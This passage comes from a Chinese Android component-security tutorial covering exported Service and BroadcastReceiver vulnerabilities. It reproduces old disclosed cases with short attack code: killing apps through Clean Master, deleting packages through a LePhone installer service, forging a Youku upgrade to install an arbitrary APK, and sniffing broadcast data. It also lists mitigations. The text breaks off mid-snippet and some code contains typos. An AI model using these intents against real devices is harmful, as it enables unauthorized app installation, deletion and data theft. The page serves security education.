class="line"></span><br><span class="line">隐式启动：</span><br><span class="line">(<span class="number">1</span>) 使用Action </span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//service中定义的action</span></span><br><span class="line">intent.setPackage(getPackageName);需要设置的应用包名</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>) 使用包名启动</span><br><span class="line"><span class="type">IntenComponentName</span> <span class="variable">componentName</span> <span class="operator">=</span> New <span class="title function_">ComponentName</span><span class="params">(getPackageName()</span>,<span class="string">&quot;com.example.testservices.TestService&quot;</span>);</span><br><span class="line">intent.setComponent(componentName);</span><br><span class="line">startService(intent);<span class="type">t</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br></pre></td></tr></table></figure><h3 id="bindService启动">bindService启动</h3><p>我们要实现服务或活动之间的通讯，我们要使用bind通信机制</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原理解析</span><br><span class="line">（<span class="number">1</span>）bindService启动的服务和调用者是典型的<span class="keyword">client</span>-service模式。调用者是<span class="keyword">client</span>，service是service端，service只有一个，但是绑定到service上的<span class="keyword">client</span>可以有一个或者多个</span><br><span class="line">（<span class="number">2</span>）<span class="keyword">client</span>可以通过IBinder接口获取Service实例，从而实现在<span class="keyword">client</span>端直接调用service，可以灵活交互</span><br><span class="line">（<span class="number">3</span>）bindService启动的服务的生命周期与绑定的<span class="keyword">client</span>息息相关，当<span class="keyword">client</span>销毁时，解除绑定，或者使用unbindService()方法解除绑定</span><br></pre></td></tr></table></figure><p><strong>实现步骤</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">服务端</span><br><span class="line">（<span class="number">1</span>）定义一个类继承Service</span><br><span class="line">（<span class="number">2</span>）在Service的onBind()方法中返回IBinder类型的实例</span><br><span class="line">（<span class="number">3</span>）在service中创建binder的内部类，加入类似getService()方法返回Service，这样绑定的<span class="keyword">client</span>就可以通过getService()方法获得Service实例了</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">（<span class="number">1</span>）在Manifest中配置Service</span><br><span class="line">（<span class="number">2</span>）创建ServiceConnection类型实例，并重写onServiceConnected()方法和onServiceDisconnected()方法</span><br><span class="line">（<span class="number">3</span>）当执行到onServiceConnected回调时，可通过IBinder实例得到Service实例对象，这样可实现<span class="keyword">client</span>与Service的连接</span><br><span class="line">（<span class="number">4</span>）onServiceDisconnected回调被执行时，表示<span class="keyword">client</span>与Service断开连接，在此可以写一些断开连接后需要做的处理</span><br><span class="line">（<span class="number">5</span>）通过Intent 启动服务Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyService.<span class="keyword">class</span>);</span><br><span class="line">（<span class="number">6</span>）使用Context的bindService(Intent,ServiceConnection,<span class="built_in">int</span>)方法启动该Service</span><br><span class="line">（<span class="number">7</span>）不再使用时，调用unbindService(ServiceConnection)方法停止该服务</span><br></pre></td></tr></table></figure><h3 id="Service漏洞原理分析">Service漏洞原理分析</h3><p><strong>漏洞种类</strong></p><ul><li>权限提升</li><li>service劫持</li><li>消息伪造</li><li>拒绝服务</li></ul><p>如果一个导出的Service没有做严格的限制，任何应用都可以去启动并绑定到这个Service上，取决于被暴露的功能， 这可以是一个应用去执行未授权的行为，获取敏感信息或污染修改内部应用的状态造成威胁。</p><h4 id="权限提升">权限提升</h4><p><strong>原理介绍</strong></p><p>当一个service配置了 intent-filter 默认是被导出的，如果没有对调用Service进行权限限制或者没有对调用者的身份进行有效验证，那么恶意构造的app都可以对此Service传入恰当的参数进行调用，导致恶意行为发生。</p><p><strong>漏洞复现</strong></p><p>案例1 <a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048735"><strong>猎豹清理大师内存清理权限泄露漏洞</strong></a></p><p>漏洞描述：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android应用程序猎豹清理大师（原金山清理大师）``<span class="number">4.0</span>``.``<span class="number">1</span>``及以下版本存在权限泄漏漏洞，泄露的权限为android<span class="selector-class">.permission</span>.RESTART_PACKAGES，用来结束进程来达到清理内存的目的。当没有申请此权限的app向猎豹清理大师发送相应的intent时，便可以结束后台运行的部分app进程。</span><br><span class="line">猎豹清理大师暴露了com<span class="selector-class">.cleanmaster</span><span class="selector-class">.appwidget</span>.WidgetService服务组件（详见下图），当向此服务发送action为com<span class="selector-class">.cleanmaster</span><span class="selector-class">.appwidget</span>.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程。</span><br></pre></td></tr></table></figure><p><img src="https://bbs.kanxue.com/upload/attach/202109/905443_UNDUAUVQQNFQGW6.png" alt="image-20210908160946499"></p><p><strong>攻击代码：</strong></p><p>使用intent，开启service服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.cleanmaster.appwidget.ACTION_FASTCLEAN&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.cleanmaster.appwidget.WidgetService&quot;</span>);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure><p>案例二：<a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2010-0509"><strong>乐phone手机任意软件包安装删除漏洞</strong></a></p><p><strong>漏洞描述</strong>：</p><p>乐phone手机出厂默认包含一个名为jp.aplix.midp.tools的应用包。本应用以system权限运行，并向其他应用提供ApkInstaller服务，用来进行对Apk文件的安装和删除。通过向ApkInstaller服务传递构造好的参数，没有声明任何权限的应用即可达到安装和删除任意Package的行为，对系统安全性产生极大影响。</p><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">in.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;jp.aplix.midp.tools&quot;</span>,<span class="string">&quot;jp.aplix.midp.tools.ApkInstaller&quot;</span>));</span><br><span class="line">in.putExtra(<span class="string">&quot;action&quot;</span>, <span class="string">&quot;deleteApk&quot;</span>);</span><br><span class="line">in.putExtra(<span class="string">&quot;pkgName&quot;</span>, <span class="string">&quot;xxxxx&quot;</span>);</span><br><span class="line">startService(in);</span><br></pre></td></tr></table></figure><h4 id="service劫持">service劫持</h4><p><strong>攻击原理</strong>：隐式启动service，当存在同名service时，先安装应用的service优先级高</p><h4 id="消息伪造">消息伪造</h4><p><strong>原理介绍</strong>：</p><p>暴露的service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患</p><p><strong>漏洞复现</strong></p><p>案例：<a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094635"><strong>优酷Android 4.5客户端升级漏洞</strong></a></p><p><strong>漏洞描述</strong></p><p>优酷Android 4.5客户端组件暴露导致第三方应用可以触发其升级过程，同时可以指定升级下载的URL地址，可导致任意应用安装！</p><p>暴露组件：<code>com.youku.service.push.StartActivityService</code></p><p>该组件对应的部分代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onHandleIntent</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        Intent v0;</span><br><span class="line">        String v23;</span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">pushMsg</span> <span class="operator">=</span> intent.getSerializableExtra(<span class="string">&quot;PushMsg&quot;</span>);</span><br><span class="line">        ......</span><br><span class="line">        AppVersionManager.getInstance(Youku.context).showAppAgreementDialog();</span><br><span class="line">        <span class="keyword">switch</span>(pushMsg.type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                <span class="keyword">goto</span> label_53;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    label_53:</span><br><span class="line">        intent.setFlags(<span class="number">876609536</span>);</span><br><span class="line">        intent.setClass(<span class="built_in">this</span>, UpdateActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateurl&quot;</span>, pushMsg.updateurl);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateversion&quot;</span>, pushMsg.updateversion);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updatecontent&quot;</span>, pushMsg.updatecontent);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateType&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">this</span>.startActivity(intent);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p><strong>漏洞分析</strong></p><p>我们可以发现从Intent从获取名为PushMsg的Serializable的数据，并根据其成员type来执行不同的流程，当type值为1时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址。</p><p><strong>漏洞攻击</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用下面代码 修改pushMsg内容，并重打包进目标应用中 进而实现伪造</span></span><br><span class="line"><span class="type">PushMsg</span> <span class="variable">pushMsg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PushMsg</span>();</span><br><span class="line">pushMsg.type = <span class="number">1</span>;</span><br><span class="line">pushMsg.updateurl = <span class="string">&quot;http://gdown.baidu.com/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;</span>;</span><br><span class="line">pushMsg.updatecontent = <span class="string">&quot;This is Fake&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.youku.phone&quot;</span>,<span class="string">&quot;com.youku.service.push.StartActivityService&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;PushMsg&quot;</span>, pushMsg);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure><p>其中PushMsg类不需要完整实现，只需要编译通过即可；<br>2.反编译优酷客户端的App得到smali代码，从中提取出PushMsg.smali；<br>3.反编译上述创建的APK文件，将原PushMsg类的smali文件替换为优酷中的PushMsg.smali文件，重新打包签名；<br>4.安装并运行重打包后的APK，会看到优酷的升级页面触发，如果设计的好的话，是可以诱导用户安装攻击者指定的APK文件的。</p><h4 id="拒接服务攻击"><strong>拒接服务攻击</strong></h4><p><strong>原理介绍</strong></p><p>Service的拒绝服务主要源于Service启动时对接收的Intent等没有做异常处理情况下，导致崩溃，主要体现在给Service传输的intent或者传输序列化对象导致接收时候的类型传化异常。</p><p><strong>漏洞复现</strong></p><p><a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048028"><strong>雪球最新Android客户端存在空指针异常及信息泄露漏洞</strong></a></p><p>adb shell 下执行下面命令，虚拟机将崩溃。愿意在于空指针调用</p><p><img src="assets/905443_N58T5GMF5RW6URH.png" alt="image-20210908160946499"></p><h4 id="Service的安全防护">Service的安全防护</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">安全防护：</span><br><span class="line">    （<span class="number">1</span>）私有service不定义<span class="built_in">int</span>ent-filter并且设置exported为<span class="literal">false</span></span><br><span class="line">    （<span class="number">2</span>）公开的service设置exported为<span class="literal">true</span>，<span class="built_in">int</span>ent-filter可以定义或者不定义</span><br><span class="line">    （<span class="number">3</span>）合作service需对合作方的app签名做校验</span><br><span class="line">    （<span class="number">4</span>）只被应用本身使用的service应设置为私有</span><br><span class="line">    （<span class="number">5</span>）service接收的数据需要谨慎处理</span><br><span class="line">    （<span class="number">6</span>）内部service需要使用签名级别的protectionLevel来判断是否为内部应用调用</span><br><span class="line">    （<span class="number">7</span>）不应在service创建（onCreate方法被调用）的时候决定是否提供服务，应在onStartCommand/onBind/onHandleIntent等方法被调用时做判断</span><br><span class="line">    （<span class="number">8</span>）当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险</span><br><span class="line">    （<span class="number">9</span>）有明确的服务需调用时使用显示意图</span><br><span class="line">    （<span class="number">10</span>）尽量不发送敏感信息</span><br><span class="line">    （<span class="number">11</span>）启动Activity时不设置<span class="built_in">int</span>ent的FLAG_ACTIVITY_NEW_TASK标签</span><br></pre></td></tr></table></figure><h2 id="BroadcastReceiver相关漏洞">BroadcastReceiver相关漏洞</h2><h3 id="自定义广播接收者BroadcastReceiver">自定义广播接收者BroadcastReceiver</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 继承BroadcastReceivre类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">mBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 复写onReceive()方法</span></span><br><span class="line">  <span class="comment">// 接收到广播后，则自动调用该方法</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">   <span class="comment">//写入接收广播后的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">操作步骤：</span><br><span class="line">（<span class="number">1</span>）继承BroadcastReceivre基类</span><br><span class="line">（<span class="number">2</span>）必须复写抽象方法onReceive()方法</span><br><span class="line">    广播接收器接收到相应广播后，会自动回调 onReceive() 方法，一般情况下，onReceive方法会涉及 与 其他组件之间的交互，如发送Notification、启动Service等，默认情况下，广播接收器运行在 UI 线程，因此，onReceive()方法不能执行耗时操作，否则将导致ANR</span><br></pre></td></tr></table></figure><h3 id="广播接收者注册"><strong>广播接收者注册</strong></h3><p>注册的两种方式：静态注册，动态注册</p><p><strong>静态注册</strong></p><p>在AndroidManifest.xml里通过<receive>标签声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    //<span class="attr">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //用于接收网络状态改变时发出的广播</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>动态注册</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">I <span class="type">ntentFilter</span> <span class="variable">intentFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">intentFilter</span>();</span><br><span class="line">intentFilter.addAction(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">registerReceiver(<span class="string">&quot;networkChangeReceiver&quot;</span>,intentFilter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPause</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.onPause;</span><br><span class="line">    unregisterReceive(networkChangeReceiver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">networkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">        Toast.makeText(context,<span class="string">&quot;network changes&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）实例化自定义的广播接收者，我们实现广播的功能，可以继承BroadcastReceiver类，并重写类中的方法</span><br><span class="line">（<span class="number">2</span>）实例化意图过滤器，并设置要过滤的广播类型</span><br><span class="line">（<span class="number">3</span>）使用Context的<span class="built_in">registerReceiver</span>(BroadcastReceiver,IntentFilter)方法注册广播</span><br><span class="line">（<span class="number">4</span>）在<span class="built_in">onDestory</span>()方法中通过调用<span class="built_in">unregisterReceiver</span>()方法来实现取消注册</span><br></pre></td></tr></table></figure><h3 id="广播的类型">广播的类型</h3><h4 id="普通广播">普通广播</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="comment">//对应BroadcastReceiver中intentFilter的action</span></span><br><span class="line">intent.setAction(<span class="string">&quot;BROADCAST_ACTION&quot;</span>);</span><br><span class="line"><span class="comment">//发送广播</span></span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>若被注册了的广播接收者中注册时intentFilter的action与上述匹配，则会接收此广播（即进行回调onReceive()）,如下mBroadcastReceiver则会接收上述广播</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    //<span class="attr">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //用于接收网络状态改变时发出的广播</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;BROADCAST_ACTION&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果发送的广播有对应权限，那么广播接收者也需要对应权限</p><h4 id="系统广播："><strong>系统广播：</strong></h4><p>Android中内置了多个系统广播：只要涉及到手机的基本操作（如开机、网络状态变化、拍照等），都会发送相应的广播每个广播都有特定的Intent-Filter(包括具体的action)，Android系统广播action如下：</p><h4 id="有序广播">有序广播</h4><p>发送出去的广播被广播接收者按照先后顺序接收 有序是针对广播接收者而言的。广播接收者接收广播的顺序规则（同时面向静态和动态注册的广播接收者）：</p><p>（1）按照Priority属性值从大-小排序<br>（2）Priority属性相同者，动态注册的广播优先</p><p><strong>特点</strong></p><p>（1）接收广播按顺序接收<br>（2）先接收的广播接收者可以对广播进行截断，即后接收的广播接收者不在接收此广播，可以使用abortBroadcast()方法<br>（3）先接收的广播接收者可以对广播进行修改，那么后接收的广播接收者将接收到被修改后的广播</p><p>具体使用：有序广播的使用过程与普通广播非常类似，差异仅在于广播的发送方式</p><p><code>sendOrderedBroadcast(intent,null); //参数1：接收的Intent 参数2：与权限相关字符串，一般为null</code></p><h4 id="本地广播">本地广播</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">由于Android中的广播可以跨<span class="keyword">App</span>直接通信（exported对于有intent-filter情况下默认值为true）</span><br><span class="line">导致可能会出现的问题：</span><br><span class="line">    （1）其他<span class="keyword">App</span>针对性发出与当前<span class="keyword">App</span> intent-filter相匹配的广播，由此导致当前<span class="keyword">App</span>不断接收广播并处理</span><br><span class="line">    （2）其他<span class="keyword">App</span>注册与当前<span class="keyword">App</span>一致的intent-filter用于接收广播，获取广播的具体星系，会出现安全性和效率性问题</span><br><span class="line">解决方案：</span><br><span class="line">使用<span class="keyword">App</span>应用内广播（<span class="keyword">Local</span> Broadcast）</span><br><span class="line">    (1)<span class="keyword">App</span>应用内广播可理解为一种局部广播，广播的发送者和接收者都同属于一个<span class="keyword">App</span></span><br><span class="line">    (2)相比于全局广播（普通广播），<span class="keyword">App</span>应用内广播优势体现在：安全性高和效率高</span><br></pre></td></tr></table></figure><p><strong>实现步骤</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">1</span>：</span><br><span class="line">将全局广播设置为局部广播</span><br><span class="line">（<span class="number">1</span>）注册广播是将exported属性设置为<span class="literal">false</span>，使得非本App内部发出的此广播不被接收</span><br><span class="line">（<span class="number">2</span>）在广播的发送和接收时，增设相应权限permission，用于权限验证</span><br><span class="line">（<span class="number">3</span>）发送广播时指定该广播接收器所在的包名，此广播将只会发送到此包中的App内与之相匹配的有效广播接收器中</span><br><span class="line">通过<span class="built_in">int</span>ent.setPackage(packageName)指定包名</span><br><span class="line"> </span><br><span class="line">方法<span class="number">2</span>：</span><br><span class="line">    使用封装好的LocalBroadcastManager类使用方式上与全局广播几乎相同，只是注册/取消注册广播接收器和发送广播时将参数context变成LocalBroadcastManager的单一实例。</span><br><span class="line">注意：对于LocalBroadcastManager方式发送的应用内广播，只能通过LocalBroadcastManager动态注册，不能静态注册</span><br></pre></td></tr></table></figure><p>方法二的具体实现：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册应用内广播接收器</span></span><br><span class="line"><span class="comment">//步骤1：实例化BroadcastReceiver子类 &amp; IntentFilter mBroadcastReceiver</span></span><br><span class="line">mBroadcastReceiver = new mBroadcastReceiver();</span><br><span class="line">IntentFilter <span class="built_in">int</span>entFilter = new IntentFilter();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//步骤2：实例化LocalBroadcastManager的实例</span></span><br><span class="line">localBroadcastManager = LocalBroadcastManager.getInstance(<span class="keyword">this</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//步骤3：设置接收广播的类型</span></span><br><span class="line"><span class="built_in">int</span>entFilter.addAction(android.net.conn.CONNECTIVITY_CHANGE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//步骤4：调用LocalBroadcastManager单一实例的registerReceiver（）方法进行动态注册</span></span><br><span class="line">localBroadcastManager.registerReceiver(mBroadcastReceiver, <span class="built_in">int</span>entFilter);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//取消注册应用内广播接收器</span></span><br><span class="line">localBroadcastManager.unregisterReceiver(mBroadcastReceiver);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//发送应用内广播</span></span><br><span class="line">Intent <span class="built_in">int</span>ent = new Intent();</span><br><span class="line"><span class="built_in">int</span>ent.setAction(BROADCAST_ACTION);</span><br><span class="line">localBroadcastManager.sendBroadcast(<span class="built_in">int</span>ent);</span><br></pre></td></tr></table></figure><h3 id="BroadcastReceiver漏洞原理分析">BroadcastReceiver漏洞原理分析</h3><p><strong>漏洞种类</strong></p><ul><li>敏感信息泄露</li><li>权限绕过</li><li>消息伪造</li><li>拒绝服务</li></ul><h4 id="敏感信息泄露">敏感信息泄露</h4><p><strong>原理介绍</strong>：</p><p>发送的intent没有明确指定接受者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。</p><p><strong>漏洞复现</strong></p><p>案例1</p><p>目标程序段代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">d</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    v1.setAction(<span class="string">&quot;com.sample.action.server_running&quot;</span>);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;local_ip&quot;</span>,v0.h);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;port&quot;</span>,v0.i);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;code&quot;</span>,v0.g);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;connected&quot;</span>,v0.s);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;pwd_predefined&quot;</span>,v0.r);</span><br><span class="line">    <span class="keyword">if</span>(!TextUtils.isEmpty(v0.t))&#123;</span><br><span class="line">        v1.putExtra(<span class="string">&quot;connected_usr&quot;</span>,v0.t);</span><br><span class="line">    &#125;</span><br><span class="line">    sendBroadcast(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过intent隐式传递数据，所以编写一个接受者代码，响应action然后获取敏感数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span 